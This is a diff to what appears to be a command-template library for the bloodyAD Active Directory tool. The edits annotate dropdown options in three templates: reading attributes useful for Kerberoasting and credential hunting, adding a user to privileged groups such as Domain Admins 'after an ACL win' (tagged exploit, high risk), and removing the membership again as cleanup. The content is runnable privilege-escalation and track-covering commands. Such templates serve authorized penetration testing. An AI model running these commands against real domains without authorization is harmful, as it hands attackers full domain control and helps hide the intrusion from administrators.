@@ -29,7 +29,7 @@ bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get ob
 Read one specific attribute from one object — faster than dumping everything when you know the target.
 
 ```bash
-bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get object {{TARGET_USER}} --attr {{ATTRIBUTE:choice:servicePrincipalName,userPrincipalName,memberOf,sAMAccountName,distinguishedName,userAccountControl,msDS-AllowedToDelegateTo,msDS-AllowedToActOnBehalfOfOtherIdentity,msDS-KeyCredentialLink,objectSid,primaryGroupID,description,pwdLastSet,ntSecurityDescriptor}}
+bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get object {{TARGET_USER}} --attr {{ATTRIBUTE:choice:servicePrincipalName=SPN (Kerberoast target),userPrincipalName=UPN login name,memberOf=group memberships,sAMAccountName=pre-Win2k logon,distinguishedName=full LDAP path,userAccountControl=account flags,msDS-AllowedToDelegateTo=constrained delegation targets,msDS-AllowedToActOnBehalfOfOtherIdentity=RBCD trustee,msDS-KeyCredentialLink=shadow creds key,objectSid=security identifier,primaryGroupID=primary group RID,description=free-text (creds sometimes),pwdLastSet=last password change,ntSecurityDescriptor=object DACL}}
 ```
 
 <!-- meta: risk=low | phase=recon | tags=enum,attribute -->
@@ -84,7 +84,7 @@ bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set pa
 Add a principal to a group — most common use is adding yourself to a privileged group after an ACL win.
 
 ```bash
-bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add groupMember '{{GROUP:choice:Domain Admins,Enterprise Admins,Administrators,Schema Admins,Backup Operators,Server Operators,Account Operators,Print Operators,DnsAdmins,Group Policy Creator Owners,Remote Desktop Users,Domain Users,Domain Computers,Domain Controllers}}' {{TARGET_USER}}
+bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add groupMember '{{GROUP:choice:Domain Admins=full domain rights,Enterprise Admins=forest-wide rights,Administrators=local admin group,Schema Admins=schema modification rights,Backup Operators=backup/restore rights,Server Operators=server management,Account Operators=user account mgmt,Print Operators=printer management,DnsAdmins=DNS admin (RCE-prone),Group Policy Creator Owners=GPO creation,Remote Desktop Users=RDP access,Domain Users=all domain accounts,Domain Computers=all domain hosts,Domain Controllers=all DCs}}' {{TARGET_USER}}
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=acl,group,addmember -->
@@ -271,7 +271,7 @@ bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove
 Remove a principal from a group — cleanup after a membership-based privesc.
 
 ```bash
-bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove groupMember '{{GROUP:choice:Domain Admins,Enterprise Admins,Administrators,Schema Admins,Backup Operators,Server Operators,Account Operators,Print Operators,DnsAdmins,Group Policy Creator Owners,Remote Desktop Users,Domain Users,Domain Computers,Domain Controllers}}' {{TARGET_USER}}
+bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove groupMember '{{GROUP:choice:Domain Admins=full domain rights,Enterprise Admins=forest-wide rights,Administrators=local admin group,Schema Admins=schema modification rights,Backup Operators=backup/restore rights,Server Operators=server management,Account Operators=user account mgmt,Print Operators=printer management,DnsAdmins=DNS admin (RCE-prone),Group Policy Creator Owners=GPO creation,Remote Desktop Users=RDP access,Domain Users=all domain accounts,Domain Computers=all domain hosts,Domain Controllers=all DCs}}' {{TARGET_USER}}
 ```
 
 <!-- meta: risk=med | phase=post | tags=cleanup,group -->
